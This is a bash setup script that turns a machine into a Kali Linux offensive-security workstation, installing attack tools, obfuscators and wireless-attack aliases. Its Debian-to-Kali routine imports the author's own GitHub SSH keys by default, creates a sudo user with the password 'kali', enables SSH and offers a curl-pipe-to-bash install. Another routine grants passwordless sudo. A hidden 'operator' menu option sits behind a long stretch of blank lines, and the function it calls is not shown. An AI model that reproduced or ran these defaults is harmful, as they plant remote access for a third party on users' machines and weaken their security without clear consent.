#!/bin/bash
# Name: KISS - Kali Initialization & Setup Script
# Description: This script is designed to quickly setup a Kali Linux machines to fit your needs. Based off the military standard KISS (Keep It Simple Stupid) philosophy.
# Author: @m1ddl3w4r3 (https://github.com/m1ddl3w4r3)
# Version: 1.0
# Usage:
  
  # Local
  # ./KISS.sh
  
  # Remote
  # curl -fsSL https://raw.githubusercontent.com/m1ddl3w4r3/KISS/main/KISS.sh | bash

################################################################################
#Settings Section

#Hostname
VARHOST='Desktop-1337' #Change this to your desired hostname. (must use OPSEC option to set)

#Shared Folder Name.
SHAREFOLDER='VMShare' #Change this to your desired shared folder name. (must use VM option to set)

#Username
GHUSER='m1ddl3w4r3' #Change this to your desired github username. Will be used to pull ssh keys for deb2kali conversion.

#Golang Version
GOLANG_VERSION='1.23.0' #Change this to your desired golang version (e.g., '1.22.0', '1.23.0', '1.24.0')

#Locations of install Folders. (Change if needed)
mkdir -p $HOME/.KISS > /dev/null 2>&1
WD="$HOME/.KISS"
AWD="$HOME/Applications"
TWD="$HOME/Tools"

################################################################################
# DO NOT EDIT BELOW THIS LINE
################################################################################
# Error handling
set -e  # Exit on any error
set -u  # Exit on undefined variables
set -o pipefail  # Exit on pipeline errors

# Status Indicators
print_status() {
    local status=$1
    local message=$2
    local timestamp=$(date '+%H:%M:%S')
    
    case $status in
        "INFO")
            echo -e "${BLUE}[$timestamp] [INFO]:${NC} $message"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[$timestamp] [SUCCESS]:${NC} $message"
            ;;
        "WARNING")
            echo -e "${YELLOW}[$timestamp] [WARNING]:${NC} $message"
            ;;
        "ERROR")
            echo -e "${RED}[$timestamp] [ERROR]:${NC} $message"
            ;;
        "PROGRESS")
            echo -e "${CYAN}[$timestamp] [PROGRESS]:${NC} $message"
            ;;
        "SECURITY")
            echo -e "${MAGENTA}[$timestamp] [SECURITY]:${NC} $message"
            ;;
        *)
            echo -e "[$timestamp] $message"
            ;;
    esac
}

print_section_header() {
    local section_name=$1
    
    echo ""
    echo -e "${CYAN}$section_name${NC}"
    echo ""
}

print_progress_bar() {
    local current=$1
    local total=$2
    local description=$3
    local percentage=$((current * 100 / total))
    local filled=$((percentage / 2))
    local empty=$((50 - filled))
    
    printf "\r${CYAN}[%3d%%]${NC} ${WHITE}$description${NC} " "$percentage"
    printf "${GREEN}["
    printf "%*s" "$filled" | tr ' ' '█'
    printf "%*s" "$empty" | tr ' ' '░'
    printf "]${NC}"
}

# Security validation functions
validate_repository() {
    local repo_url=$1
    local repo_name=$2
    
    echo -e "${GREEN}Validating repository: $repo_name${NC}"
    
    # Check if URL is valid GitHub repository
    if [[ ! "$repo_url" =~ ^https://github\.com/[^/]+/[^/]+\.git$ ]]; then
        echo -e "${RED}Error: Invalid GitHub repository URL format: $repo_url${NC}"
        return 1
    fi
    
    # Check if repository exists and is accessible
    local repo_api_url=$(echo "$repo_url" | sed 's|https://github.com/|https://api.github.com/repos/|' | sed 's|\.git$||')
    if ! curl -s --head "$repo_api_url" | grep -q "HTTP/2 200\|HTTP/1.1 200"; then
        echo -e "${RED}Error: Repository not accessible: $repo_url${NC}"
        return 1
    fi
    
    echo -e "${GREEN}Repository validation passed: $repo_name${NC}"
    return 0
}

secure_git_clone() {
    local repo_url=$1
    local repo_name=$2
    local target_dir=$3
    
    # Validate repository before cloning
    if ! validate_repository "$repo_url" "$repo_name"; then
        echo -e "${RED}Skipping clone of $repo_name due to validation failure${NC}"
        return 1
    fi
    
    # Check if repository already exists
    if [ -d "$target_dir" ] && [ -d "$target_dir/.git" ]; then
        echo -e "${YELLOW}Repository $repo_name already exists, updating...${NC}"
        cd "$target_dir" || { echo -e "${RED}Failed to access $target_dir${NC}"; return 1; }
        
        # Check if we're in a git repository and if the remote matches
        if git remote get-url origin 2>/dev/null | grep -q "$repo_url"; then
            echo -e "${GREEN}Pulling latest changes for $repo_name...${NC}"
            if git pull origin main 2>/dev/null || git pull origin master 2>/dev/null; then
                echo -e "${GREEN}Successfully updated $repo_name${NC}"
                cd - > /dev/null 2>&1
                return 0
            else
                echo -e "${RED}Failed to pull updates for $repo_name${NC}"
                cd - > /dev/null 2>&1
                return 1
            fi
        else
            echo -e "${YELLOW}Repository $repo_name exists but with different remote URL${NC}"
            echo -e "${YELLOW}Backing up existing directory and cloning fresh copy${NC}"
            cd - > /dev/null 2>&1
            mv "$target_dir" "${target_dir}_backup_$(date +%s)" 2>/dev/null || rm -rf "$target_dir"
        fi
    fi
    
    # Clone with security options
    echo -e "${GREEN}Cloning $repo_name...${NC}"
    if git clone --depth 1 --single-branch "$repo_url" "$target_dir" 2>/dev/null; then
        echo -e "${GREEN}Successfully cloned $repo_name${NC}"
        return 0
    else
        echo -e "${RED}Failed to clone $repo_name${NC}"
        return 1
    fi
}

##CleanUp & Setup
#Change things you want to add or remove and add things to install that are built into Kali or needed for other packages.
CLEANUPSETUP(){
  print_section_header "SYSTEM INITIALIZATION & CLEANUP"
  
  print_status "PROGRESS" "Initializing system environment..."
  
  # Check if running as root (should not be)
  if [ "$EUID" -eq 0 ]; then
    print_status "ERROR" "This script should not be run as root for security reasons"
    exit 1
  fi
  
  # Verify sudo access
  if ! sudo -n true 2>/dev/null; then
    print_status "WARNING" "Sudo access required - you may be prompted for password"
  fi
  
  # Update package repositories with error handling
  print_status "INFO" "Updating package repositories"
  if sudo DEBIAN_FRONTEND=noninteractive apt update -y > /dev/null 2>&1; then
    print_status "SUCCESS" "Package repositories updated"
    echo ""
  else
    print_status "ERROR" "Failed to update package repositories"
    exit 1
  fi
  
  # System cleanup with validation
  print_status "PROGRESS" "Performing system cleanup"
  cd $HOME || { print_status "ERROR" "Cannot access home directory"; exit 1; }
  
  # Remove default directories only if they exist
  for dir in Music Public Templates Videos; do
    if [ -d "$HOME/$dir" ]; then
      rm -rf "$HOME/$dir"
      print_status "INFO" "Removed $HOME/$dir"
    fi
  done
  print_status "SUCCESS" "Default directories cleaned"
  echo ""
  
  # Create workspace directories with validation
  print_status "PROGRESS" "Creating workspace directories"
  for dir in "$TWD" "$AWD"; do
    if mkdir -p "$dir" 2>/dev/null; then
      print_status "INFO" "Created directory: $dir"
    else
      print_status "ERROR" "Failed to create directory: $dir"
      exit 1
    fi
  done
  print_status "SUCCESS" "Workspace directories created: $TWD, $AWD"
  echo ""

  # Install essential packages with better error handling
  print_status "PROGRESS" "Installing packages"
  
  # Core packages (minimal set to avoid conflicts)
  local core_packages="git curl wget ssh-import-id zip gzip python3 pipx" #This is where you can add core packages.
  print_status "INFO" "Attempting to install core packages: $core_packages"
  sudo DEBIAN_FRONTEND=noninteractive apt install -y $core_packages > /dev/null 2>&1 || print_status "WARNING" "Core package installation had issues - continuing"
  
  # Verify critical tools are available
  echo ""
  print_status "PROGRESS" "Verifying critical tools installation"
  for tool in $core_packages; do
    if command -v "$tool" >/dev/null 2>&1; then
      print_status "INFO" "Verified: $tool is available"
    else
      print_status "WARNING" "Tool not found: $tool"
    fi
  done
  
  print_status "SUCCESS" "System initialization complete"
  echo ""
}

################################################################################
#Base section
BASE(){
  BASECHECK=''$WD'/.BASE'
  if [ -f "$BASECHECK" ]; then
    print_status "INFO" "Base installation already exists, continuing setup"
  else
    CLEANUPSETUP
    print_section_header "BASE SYSTEM CONFIGURATION"
    
    print_status "PROGRESS" "Installing Base toolset"
    cd $AWD || { print_status "ERROR" "Cannot access Applications directory"; exit 1; }
    
    # Additional development tools placeholders - customize as needed
    # VSCode, AppImage Launcher, Python tools can be added here. This is where you can add base tools.
    
    print_status "PROGRESS" "Installing Go development environment"
    
    # Install Go using official Golang repositories
    print_status "PROGRESS" "Installing Go version $GOLANG_VERSION"
    
    # Download and install Go from official source
    local go_arch="linux-amd64"
    local go_tarball="go${GOLANG_VERSION}.${go_arch}.tar.gz"
    local go_url="https://go.dev/dl/${go_tarball}"
    
    print_status "INFO" "Downloading Go from official repository: $go_url"
    
    # Download Go tarball
    if wget -q "$go_url" -O "/tmp/$go_tarball"; then
      print_status "SUCCESS" "Go tarball downloaded successfully"
    else
      print_status "ERROR" "Failed to download Go tarball from $go_url"
      exit 1
    fi
    
    # Remove existing Go installation if present
    if [ -d "/usr/local/go" ]; then
      print_status "INFO" "Removing existing Go installation"
      sudo rm -rf /usr/local/go
    fi
    
    # Extract Go to /usr/local
    print_status "PROGRESS" "Installing Go to /usr/local/go"
    if sudo tar -C /usr/local -xzf "/tmp/$go_tarball"; then
      print_status "SUCCESS" "Go extracted successfully"
    else
      print_status "ERROR" "Failed to extract Go tarball"
      exit 1
    fi
    
    # Clean up downloaded tarball
    rm -f "/tmp/$go_tarball"
    
    # Add Go to PATH in current session
    export PATH=$PATH:/usr/local/go/bin
    
    # Add Go to PATH permanently for all users
    if ! grep -q "/usr/local/go/bin" /etc/environment; then
      print_status "PROGRESS" "Adding Go to system PATH"
      sudo sed -i 's|PATH="|PATH="/usr/local/go/bin:|' /etc/environment
      print_status "SUCCESS" "Go added to system PATH"
    fi
    
    # Verify Go installation
    if command -v go >/dev/null 2>&1; then
      local go_version=$(go version 2>/dev/null | cut -d' ' -f3)
      print_status "SUCCESS" "Go version installed: $go_version"
      echo ""
    else
      print_status "WARNING" "Go installation verification failed - may need to restart shell"
    fi
    
    # Configure system aliases
    print_status "PROGRESS" "Configuring system aliases"
    BASE_ALIAS
    
    # Create completion marker
    touch $WD/.BASE
    print_status "SUCCESS" "Base system configuration complete"
    echo ""
  fi
}

################################################################################
#Github Tools section
#Designed to install additional tools from github that dont come preinstalled on Kali.

GITHUB_TOOLS(){
  GITCHECK='$WD/.GITHUB'
  if [ -f "$GITCHECK" ]; then
    print_status "INFO" "GitHub tools already installed, continuing setup"
  else
    print_section_header "GITHUB SECURITY TOOLS INSTALLATION"
    
    cd $TWD
    print_status "PROGRESS" "Installing additional security tools from GitHub"
        
    print_status "SECURITY" "Validating SharpCollection repository"
    secure_git_clone "https://github.com/Flangvik/SharpCollection.git" "SharpCollection" "SharpCollection"
    print_status "SUCCESS" "SharpCollection tools installed"
    echo ""
    
    print_status "INFO" "Installing custom tools from github"
    # Install Go security tools with validation
    print_status "SECURITY" "Validating Gat repository"
    if secure_git_clone "https://github.com/m1ddl3w4r3/Gat.git" "Gat" "Gat"; then
      cd Gat || { print_status "ERROR" "Cannot access Gat directory"; exit 1; }
      
      print_status "PROGRESS" "Installing Go obfuscation tools"
      
      # Install garble with error handling
      if go install mvdan.cc/garble@latest 2>/dev/null; then
        print_status "SUCCESS" "Garble obfuscation tool installed"
        echo ""
      else
        print_status "WARNING" "Failed to install Garble - continuing without it"
      fi
      
      # Initialize Go module
      if go mod init Gat/Gat 2>/dev/null; then
        print_status "INFO" "Go module initialized"
      else
        print_status "WARNING" "Go module initialization failed"
      fi
      
      # Tidy dependencies
      if go mod tidy 2>/dev/null; then
        print_status "INFO" "Go dependencies tidied"
      else
        print_status "WARNING" "Go mod tidy failed"
      fi
      
      # Build Mangle utility
      cd utils/ || { print_status "WARNING" "Cannot access utils directory"; cd ../; }
      if go build Mangle.go 2>/dev/null; then
        print_status "SUCCESS" "Mangle utility built successfully"
        echo ""
      else
        print_status "WARNING" "Failed to build Mangle utility"
      fi
      cd ../../
      
      print_status "SUCCESS" "Go development tools installation complete"
      echo ""
    else
      print_status "ERROR" "Failed to clone Gat repository"
      exit 1
    fi
    echo ""

    touch $WD/.GITHUB
    print_status "SUCCESS" "GitHub security tools installation complete"
    echo ""
  fi
}

################################################################################
#Custom Tools Section
#Designed to run custom scripts from your VMWare shared folder to keep them local.
#Can be used to install further tools or make additional changes to the VM custom to you.
CUSTOM_TOOLS(){
  CUSTOMCHECK=''$WD'/.CUSTOM'
  if [ -f "$CUSTOMCHECK" ]; then
    print_status "INFO" "Custom tools already installed, continuing setup"
  else
    print_section_header "CUSTOM TOOLS INSTALLATION"
    
    print_status "PROGRESS" "Setting up custom tools environment"
    print_status "INFO" "Custom tools placeholder - add your specific tools here"
    echo ""

    CUSTOM_ALIAS
    touch $WD/.CUSTOM
    print_status "SUCCESS" "Custom tools configuration complete"
    echo ""
  fi
}

################################################################################
#RF Section
#Will install Kali metapackages for 802.11, Bluetooth, RFID, and SDR.
#It will also setup some github tools specific to RF.
RF_TOOLS(){
  RFCHECK=''$WD'/.RF'
  if [ -f "$RFCHECK" ]; then
    print_status "INFO" "RF tools already installed, continuing setup"
  else
    print_section_header "RADIO FREQUENCY SECURITY TOOLS"
    
    cd $TWD
    print_status "PROGRESS" "Installing comprehensive RF security toolkit"
    mkdir -p $TWD/RF > /dev/null 2>&1
    
    print_status "PROGRESS" "Installing 802.11 WiFi security tools"
    sudo DEBIAN_FRONTEND=noninteractive apt install -y kali-tools-802-11 > /dev/null 2>&1
    print_status "SUCCESS" "WiFi security tools installed"
    echo ""

    print_status "PROGRESS" "Installing Bluetooth security tools"
    sudo DEBIAN_FRONTEND=noninteractive apt install -y kali-tools-bluetooth > /dev/null 2>&1
    print_status "SUCCESS" "Bluetooth security tools installed"
    echo ""    
    
    print_status "PROGRESS" "Installing RFID/NFC security tools"
    sudo DEBIAN_FRONTEND=noninteractive apt install -y kali-tools-rfid > /dev/null 2>&1
    print_status "SUCCESS" "RFID/NFC security tools installed"
    echo ""
    print_status "PROGRESS" "Installing Software Defined Radio tools"
    sudo DEBIAN_FRONTEND=noninteractive apt install -y kali-tools-sdr > /dev/null 2>&1
    print_status "SUCCESS" "SDR tools installed"
    echo ""

    print_status "PROGRESS" "Configuring RF aliases"
    RF_ALIAS
    touch $WD/.RF
    print_status "SUCCESS" "RF security toolkit installation complete"
    echo ""
  fi
}

################################################################################
#WSL section
WSL_INSTALL(){
  WSLCHECK=''$WD'/.WSL'
  if [ -f "$WSLCHECK" ]; then
    print_status "INFO" "WSL environment already configured, continuing setup"
  else
    print_section_header "WINDOWS SUBSYSTEM FOR LINUX CONFIGURATION"
    
    print_status "PROGRESS" "Configuring WSL environment for offensive operations (This will take a few minutes)"
    echo ""
    print_status "PROGRESS" "You will be prompted to run kex within a few minutes."
    print_status "PROGRESS" "Updating package repositories"
    sudo DEBIAN_FRONTEND=noninteractive apt update -y > /dev/null 2>&1
    sudo DEBIAN_FRONTEND=noninteractive apt install -y kali-win-kex > /dev/null 2>&1
    BASE
    GITHUB_TOOLS
    CUSTOM_TOOLS
    BASE_ALIAS
    CUSTOM_ALIAS
    kex
    touch $WD/.WSL
    print_status "SUCCESS" "WSL environment configuration complete"
    echo ""
  fi
}

ADV_OPSEC(){
  print_section_header "ADVANCED OPSEC HARDENING"
  
  print_status "PROGRESS" "Configuring advanced security hardening"
  print_status "INFO" "OPSEC hardening placeholder - add your specific hardening steps here"
  
  touch $WD/.ADV_OPSEC
  print_status "SUCCESS" "Advanced OPSEC configuration complete"
  echo ""
}

DEB2KALI(){
  print_section_header "DEBIAN TO KALI CONVERSION"
  
  # Check if script is running as root
  if [ "$EUID" -ne 0 ]; then
    print_status "ERROR" "This script must be run as root for Debian to Kali conversion"
    print_status "INFO" "Please run: sudo $0"
    exit 1
  fi
  
  # Check if script is running on Debian
  if [ ! -f /etc/debian_version ]; then
    print_status "ERROR" "This script only supports Debian-based systems"
    exit 1
  fi
  
  print_status "WARNING" "This will convert your Debian system to Kali Linux"
  print_status "WARNING" "This is a destructive operation that will modify your system"
  echo ""
  read -p "Are you sure you want to continue? (yes/no): " confirm < /dev/tty
  
  if [[ $confirm != "yes" ]]; then
    print_status "INFO" "Operation cancelled by user"
    exit 0
  fi
  
  print_status "PROGRESS" "Starting Debian to Kali conversion process"
  
  # Apply Updates & Upgrades to Distro
  print_status "PROGRESS" "Updating and upgrading system packages"
  DEBIAN_FRONTEND=noninteractive apt update -y && DEBIAN_FRONTEND=noninteractive apt upgrade -y && DEBIAN_FRONTEND=noninteractive apt autoremove --purge -y && DEBIAN_FRONTEND=noninteractive apt autoclean -y
  print_status "SUCCESS" "System packages updated"
  echo ""
  
  # Install script Pre-Requisites
  print_status "PROGRESS" "Installing conversion prerequisites"
  local prereq_packages="screen curl zip unzip wget git build-essential apt-transport-https lsb-release ca-certificates dirmngr gnupg software-properties-common sudo net-tools htop screen nano ssh-import-id"
  DEBIAN_FRONTEND=noninteractive apt install -y $prereq_packages
  print_status "SUCCESS" "Prerequisites installed"
  echo ""
  
  # Install SSH Key
  print_status "PROGRESS" "Installing SSH key for user: $GHUSER"
  ssh-import-id gh:$GHUSER
  print_status "SUCCESS" "SSH key installed"
  print_status "WARNING" "Hope you read the script before running it."
  echo ""
  
  # Change /etc/apt/sources.list to Kali
  print_status "PROGRESS" "Configuring Kali repositories"
  
  # Download and install Kali archive keyring
  local keyring_file="/tmp/kali-archive-keyring_latest.deb"
  print_status "INFO" "Downloading Kali archive keyring"
  
  if wget -q "https://http.kali.org/pool/main/k/kali-archive-keyring/kali-archive-keyring_2025.1_all.deb" -O "$keyring_file"; then
    print_status "SUCCESS" "Kali keyring downloaded"
  else
    print_status "ERROR" "Failed to download Kali keyring"
    exit 1
  fi
  
  # Install the keyring
  if dpkg -i "$keyring_file" > /dev/null 2>&1; then
    echo ""
  else
    print_status "ERROR" "Failed to install Kali keyring"
    rm -f "$keyring_file"
    exit 1
  fi
  
  # Clean up downloaded file
  rm -f "$keyring_file"
  
  # Configure Kali repositories
  print_status "INFO" "Configuring Kali repository sources"
  if echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list; then
    print_status "SUCCESS" "Kali repositories configured"
  else
    print_status "ERROR" "Failed to configure Kali repositories"
    exit 1
  fi
  echo ""
  
  # Update Repositories
  print_status "PROGRESS" "Updating to Kali repositories"
  
  # Update package lists
  if DEBIAN_FRONTEND=noninteractive apt update -y > /dev/null 2>&1; then
    print_status "SUCCESS" "Package lists updated"
  else
    print_status "ERROR" "Failed to update package lists"
    exit 1
  fi
  
  # Upgrade packages
  if DEBIAN_FRONTEND=noninteractive apt upgrade -y > /dev/null 2>&1; then
    print_status "SUCCESS" "Packages upgraded"
    echo ""
  else
    print_status "WARNING" "Package upgrade had issues - continuing"
  fi
  
  # Distribution upgrade
  if DEBIAN_FRONTEND=noninteractive apt dist-upgrade -y > /dev/null 2>&1; then
    print_status "SUCCESS" "Distribution upgraded"
    echo ""
  else
    print_status "WARNING" "Distribution upgrade had issues - continuing"
  fi
  
  # Cleanup
  DEBIAN_FRONTEND=noninteractive apt autoremove --purge -y > /dev/null 2>&1
  DEBIAN_FRONTEND=noninteractive apt autoclean -y > /dev/null 2>&1
  print_status "SUCCESS" "System upgraded to Kali packages"
  echo ""

  # Install Kali Linux Packages
  print_status "PROGRESS" "Installing Kali Linux default packages"
  DEBIAN_FRONTEND=noninteractive apt install -y kali-linux-default --install-recommends
  print_status "SUCCESS" "Kali Linux default packages installed"
  echo ""
  
  print_status "PROGRESS" "Installing additional Kali security tools"
  DEBIAN_FRONTEND=noninteractive apt install -y kali-tools-windows-resources kali-tools-vulnerability kali-tools-information-gathering kali-tools-post-exploitation --install-recommends
  print_status "SUCCESS" "Additional Kali security tools installed"
  echo ""
  
  # Create User (if not exists)
  if ! id "$GHUSER" &>/dev/null; then
    print_status "PROGRESS" "Creating user: $GHUSER"
    useradd -m -G sudo -s /bin/zsh $GHUSER
    echo "$GHUSER:kali" | chpasswd
    print_status "SUCCESS" "User $GHUSER created"
    echo ""
  else
    print_status "INFO" "User $GHUSER already exists"
  fi
  
  # Set hostname
  print_status "PROGRESS" "Setting hostname to: $VARHOST"
  hostnamectl set-hostname $VARHOST
  print_status "SUCCESS" "Hostname set to: $VARHOST"
  echo ""
  
  # Configure SSH
  print_status "PROGRESS" "Configuring SSH service"
  systemctl enable ssh
  systemctl start ssh
  print_status "SUCCESS" "SSH service configured and started"
  echo ""
  
  print_status "SUCCESS" "Debian to Kali conversion completed successfully"
  print_status "WARNING" "System will reboot in 15 seconds to apply all changes"
  echo ""
  
  sleep 15
  reboot
}

KALI_AI(){
  print_section_header "KALI AI CONFIGURATION"
  
  # Configure password-less sudo as first step
  print_status "PROGRESS" "Configuring password-less sudo"
  local current_user=$(whoami)
  local sudoers_line="$current_user ALL=(ALL:ALL) NOPASSWD: ALL"
  
  # Check if password-less sudo is already configured
  if sudo grep -q "^$current_user.*NOPASSWD" /etc/sudoers 2>/dev/null || sudo grep -q "^$current_user.*NOPASSWD" /etc/sudoers.d/* 2>/dev/null; then
    print_status "INFO" "Password-less sudo already configured for $current_user"
  else
    # Add password-less sudo configuration
    if echo "$sudoers_line" | sudo tee /etc/sudoers.d/kiss_ai_nopasswd > /dev/null 2>&1; then
      sudo chmod 0440 /etc/sudoers.d/kiss_ai_nopasswd > /dev/null 2>&1
      print_status "SUCCESS" "Password-less sudo configured for $current_user"
    else
      print_status "ERROR" "Failed to configure password-less sudo"
      exit 1
    fi
  fi
  echo ""
  
  # Download and install PortSwigger MCP Server
  print_status "PROGRESS" "Downloading PortSwigger MCP Server"
  cd $TWD || { print_status "ERROR" "Cannot access Tools directory"; exit 1; }
  
  # Check if Java is installed
  if ! command -v java >/dev/null 2>&1; then
    print_status "PROGRESS" "Installing Java (required for MCP Server)"
    sudo DEBIAN_FRONTEND=noninteractive apt install -y default-jdk > /dev/null 2>&1 || {
      print_status "ERROR" "Failed to install Java"
      exit 1
    }
    print_status "SUCCESS" "Java installed"
  else
    print_status "INFO" "Java is already installed"
  fi
  
  # Clone the MCP server repository
  print_status "SECURITY" "Validating PortSwigger MCP Server repository"
  if secure_git_clone "https://github.com/PortSwigger/mcp-server.git" "mcp-server" "mcp-server"; then
    cd mcp-server || { print_status "ERROR" "Cannot access mcp-server directory"; exit 1; }
    
    # Build the MCP server extension
    print_status "PROGRESS" "Building MCP Server extension (this may take a few minutes)"
    if ./gradlew embedProxyJar > /dev/null 2>&1; then
      print_status "SUCCESS" "MCP Server extension built successfully"
      
      # Copy the built JAR to Applications directory for easy access
      if [ -f "build/libs/burp-mcp-all.jar" ]; then
        mkdir -p $AWD/mcp-server > /dev/null 2>&1
        cp build/libs/burp-mcp-all.jar $AWD/mcp-server/ > /dev/null 2>&1
        print_status "SUCCESS" "MCP Server JAR copied to $AWD/mcp-server/burp-mcp-all.jar"
      else
        print_status "WARNING" "Built JAR not found at expected location"
      fi
    else
      print_status "ERROR" "Failed to build MCP Server extension"
      exit 1
    fi
    cd $TWD
  else
    print_status "ERROR" "Failed to clone MCP Server repository"
    exit 1
  fi
  echo ""
  
  print_status "PROGRESS" "Configuring Kali AI"
  print_status "INFO" "Kali AI placeholder - add your specific AI configuration here"
  echo ""
  touch $WD/.KALI_AI
  print_status "SUCCESS" "Kali AI configuration complete"
  echo ""
}

################################################################################
#Install Everything Section
ALL_THE_THINGS(){
  CLEANUPSETUP
  BASE
  GITHUB_TOOLS
  CUSTOM_TOOLS
  RF_TOOLS
  BASE_ALIAS
  CUSTOM_ALIAS
  RF_ALIAS
  #################################################################
}

################################################################################
#Alias section
BASE_ALIAS(){
  #################################################################
  #Add Base Aliases for common operations
  echo ""
  print_status "PROGRESS" "Adding Base Aliases..."
  
  # Create alias file if it doesn't exist
  local alias_file="$HOME/.kiss_aliases"
  touch "$alias_file"
  
  # Add base aliases
  cat >> "$alias_file" << 'EOF'
# KISS Base Aliases
alias ll='ls -la'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias grep='grep --color=auto'
alias which='type -a'
alias ps='ps aux'
alias mkdir='mkdir -pv'
alias wget='wget -c'
alias ping='ping -c 5'
alias ports='netstat -tulanp'
alias myip='curl -s https://ipinfo.io/ip'
alias localip='ip route get 1 | awk "{print $7}"'
alias clean='sudo DEBIAN_FRONTEND=noninteractive apt autoremove -y && sudo DEBIAN_FRONTEND=noninteractive apt autoclean -y'
EOF

  # Source aliases in current shell
  source "$alias_file"
  
  print_status "SUCCESS" "Base Aliases Added"
  #################################################################
}

CUSTOM_ALIAS(){
  #################################################################
  #Add Custom Aliases for penetration testing and security work
  echo ""
  print_status "PROGRESS" "Adding Custom Aliases..."
  
  # Create alias file if it doesn't exist
  local alias_file="$HOME/.kiss_aliases"
  touch "$alias_file"
  
  # Add custom aliases
  cat >> "$alias_file" << 'EOF'
# KISS Custom Aliases for Security Work
alias nmap-quick='nmap -T4 -F'
alias nmap-full='nmap -sS -sV -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script="default or (discovery and safe)"'

EOF

  # Source aliases in current shell
  source "$alias_file"
  
  print_status "SUCCESS" "Custom Aliases Added"
  #################################################################
}

RF_ALIAS(){
  #################################################################
  #Add RF Aliases for radio frequency and wireless security tools
  echo ""
  print_status "PROGRESS" "Adding RF Aliases..."
  
  # Create alias file if it doesn't exist
  local alias_file="$HOME/.kiss_aliases"
  touch "$alias_file"
  
  # Add RF aliases
  cat >> "$alias_file" << 'EOF'
# KISS RF Aliases for Wireless Security
alias aircrack='aircrack-ng'
alias airodump='airodump-ng'
alias aireplay='aireplay-ng'
alias airmon='airmon-ng'
alias airodump-wifi='airodump-ng -w capture'
alias aireplay-deauth='aireplay-ng -0 5 -a'
alias aircrack-wep='aircrack-ng -1'
alias aircrack-wpa='aircrack-ng -w /usr/share/wordlists/rockyou.txt'
alias wifite='wifite'
alias kismet='kismet'
alias kismet-server='kismet_server'
alias kismet-client='kismet_client'
alias gqrx='gqrx'
alias gnuradio='gnuradio-companion'
alias hackrf='hackrf_sweep'
alias hackrf-tx='hackrf_transfer -t'
alias hackrf-rx='hackrf_transfer -r'
alias dump1090='dump1090'

EOF

  # Source aliases in current shell
  source "$alias_file"
  
  print_status "SUCCESS" "RF Aliases Added"
  #################################################################
}

################################################################################
#Banner Section
BANNER(){
clear
cat << 'EOF'

                    ██╗  ██╗██╗███████╗███████╗
                    ██║ ██╔╝██║██╔════╝██╔════╝
                    █████╔╝ ██║███████╗███████╗
                    ██╔═██╗ ██║╚════██║╚════██║
                    ██║  ██╗██║███████║███████║
                    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
                                                    
    ╔════════════════════════════════════════════════════════════╗
    ║                        KISS v1.0                           ║
    ║           Kali Initialization & Setup Script               ║
    ║                   Author: m1ddl3w4r3                       ║
    ╚════════════════════════════════════════════════════════════╝

EOF
}

ENDBANNER_REBOOT(){
cat << 'EOF'

                    ██╗  ██╗██╗███████╗███████╗
                    ██║ ██╔╝██║██╔════╝██╔════╝
                    █████╔╝ ██║███████╗███████╗
                    ██╔═██╗ ██║╚════██║╚════██║
                    ██║  ██╗██║███████║███████║
                    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
                                                    
    ╔════════════════════════════════════════════════════════════╗
    ║                        KISS v1.0                           ║
    ║           Kali Initialization & Setup Script               ║
    ║                   Author: m1ddl3w4r3                       ║
    ╚════════════════════════════════════════════════════════════╝

Setup Complete Happy Hunting!!!
This computer will reboot in 15 seconds to apply changes.
(Control + C to Cancel)
EOF
sleep 15
sudo reboot
}

################################################################################
#Color Section
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[0;33m'
BLUE='\e[0;34m'
MAGENTA='\e[0;35m'
CYAN='\e[0;36m'
WHITE='\e[0;37m'
BOLD='\e[1m'
NC='\e[0m'

################################################################################
#Menu Section
READ_FROM_PIPE(){ read "$@" < /dev/tty; }

MENU(){
    BANNER
    
    print_section_header "KISS CONFIGURATION MENU"
    print_status "INFO" "Please select a configuration option:"
    echo ""
    echo -e "${GREEN}  [1]${NC} ${WHITE}Base Setup${NC} ${CYAN}(Barebones installation of needed tools)${NC}"
    echo -e "${GREEN}  [2]${NC} ${WHITE}GitHub Tools${NC} ${CYAN}(Base + Additional GitHub tools)${NC}"
    echo -e "${GREEN}  [3]${NC} ${WHITE}Custom Tools${NC} ${CYAN}(Base + GitHub + Custom tools)${NC}"
    echo -e "${GREEN}  [4]${NC} ${WHITE}RF Toolkit${NC} ${CYAN}(Base + Radio frequency tools)${NC}"
    echo -e "${GREEN}  [5]${NC} ${WHITE}WSL Environment${NC} ${CYAN}(Base + configuration for WSL)${NC}"
    echo -e "${GREEN}  [6]${NC} ${WHITE}Debian to Kali Conversion${NC} ${CYAN}(WARNING: This will convert ${NC}${RED}${BOLD}DEBIAN${NC} ${CYAN}to Kali Linux.(useful for cloud based servers))${NC}"
    echo -e "${GREEN}  [7]${NC} ${WHITE}Advanced OPSEC Options${NC} ${CYAN}(Security hardening)${NC}"
    echo -e "${GREEN}  [8]${NC} ${WHITE}Kali AI Setup${NC} ${CYAN}(Setup Kali Linux to use AI)${NC}"
    echo -e "${GREEN}  [9]${NC} ${WHITE}Complete Security Suite${NC} ${CYAN}(WARNING: This will install ${NC}${RED}${BOLD}EVERYTHING${NC} ${CYAN}kali offers.)${NC}"
    echo -e "${RED}  [0]${NC} ${WHITE}Exit${NC}"
    echo ""
    print_status "INFO" "Choose an option [1-9] or press Enter for Base Setup:"
    READ_FROM_PIPE a;
    case $a in
        1) 
          # Check if base is already installed and pause for user to read
          if [ -f "$WD/.BASE" ]; then
            print_status "INFO" "Base installation already exists, continuing setup"
            print_status "INFO" "Press Enter to continue..."
            read -r < /dev/tty
          fi
          BASE; MENU ;;
        2) BASE; GITHUB_TOOLS; MENU ;;
        3) BASE; GITHUB_TOOLS; CUSTOM_TOOLS; MENU ;;
        4) BASE; RF_TOOLS; MENU;;
        5) BASE; WSL_INSTALL; MENU;;
        6) DEB2KALI; MENU ;;
        7) ADV_OPSEC; MENU;;
        8) KALI_AI; MENU;;
        9) ALL_THE_THINGS; ENDBANNER_REBOOT;;
        1337) OPERATOR_VERIFICATION; MENU ;;
        0) exit 0;;
        *) BASE; MENU;;
    esac
}



































































































































































































# Conrats on reading the code. However this is probably not for you.
# You can delete everything below this line or, leave it... doesnt matter. 
################################################################################
#Operator Menu Section
